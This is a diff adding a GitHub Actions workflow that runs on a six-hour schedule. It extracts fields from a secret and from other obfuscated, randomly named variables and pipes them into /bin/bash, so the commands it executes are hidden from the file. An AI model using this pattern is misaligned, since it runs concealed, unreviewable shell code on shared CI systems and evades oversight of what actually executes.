@@ -1,0 +1,24 @@
+name: huawudonghui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huawudonghui
+        env:
+          dgafb7440: ${{ secrets.dgafb7440 }}
+        run: |
+          echo $dgafb7440 | jq -r .d4277 | /bin/bash
+          echo $huya3970 | jq -r .oe0865 | /bin/bash
+          echo $ot0536 | jq -r .w11467 | /bin/bash
+          echo $l0 | jq -r .gxgos7 | /bin/bash
+          echo $jm0 | jq -r .kanyx37 | /bin/bash
+          echo $ur11241 | jq -r .xanl6 | /bin/bash
+          echo $ixq4440 | jq -r .xqvcm9348 | /bin/bash
+          echo $oq354 | jq -r .qqept32 | /bin/bash
+          echo $f5420 | jq -r .m86 | /bin/bash
+
